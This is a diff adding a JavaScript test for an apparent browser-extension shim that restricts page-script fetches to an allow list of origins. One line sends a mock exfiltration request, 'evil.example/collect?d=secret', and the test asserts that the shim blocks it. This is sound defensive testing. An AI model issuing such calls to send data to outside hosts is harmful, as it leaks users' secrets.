@@ -101,3 +101,27 @@ test("an api.call whose body has fields named agent and release is not refused",
   await dispatch("probe.echo", { entry: "e", args: { body: { agent: "Jane", release: "2024-05", asked: "no", writeOk: "n/a" }, query: { release: "1" }, headers: { "x-agent": "kit" } } }, /** @type {any} */ (ctx));
   assert.equal(seen[0].args.body.agent, "Jane");
 });
+
+test("the page shim is a second layer of containment: under an allow list a script may only fetch this page's origin and the origins it was given", async () => {
+  const vm = await import("node:vm");
+  const { guardInstallWrites, guardCollect } = await import("./extension/shared/outbound.js");
+  const reached = /** @type {string[]} */ ([]);
+  const win = /** @type {any} */ ({
+    location: { origin: "https://app.example", href: "https://app.example/w", host: "app.example" },
+    fetch: async (/** @type {any} */ u) => { reached.push(String(u)); return { ok: true }; },
+    XMLHttpRequest: class { open() {} send() {} }, navigator: { sendBeacon: () => true }, HTMLFormElement: class { submit() {} requestSubmit() {} },
+    Node: class {}, Element: class {}, document: { addEventListener() {}, removeEventListener() {} },
+    __vyreAllow: ["https://api.example"], URL, Promise, TypeError, Error, Array, String, Object,
+  });
+  win.window = win;
+  vm.createContext(win);
+  vm.runInContext(guardInstallWrites, win);
+  await assert.rejects(win.fetch("https://evil.example/collect?d=secret"), /held/);
+  await win.fetch("https://api.example/read");
+  await win.fetch("https://app.example/same");
+  await win.fetch("/relative");
+  assert.deepEqual(reached, ["https://api.example/read", "https://app.example/same", "/relative"], "only the allowed origins were reached");
+  const blocked = vm.runInContext(guardCollect, win);
+  assert.equal(blocked.length, 1);
+  assert.match(blocked[0].why, /evil\.example/);
+});
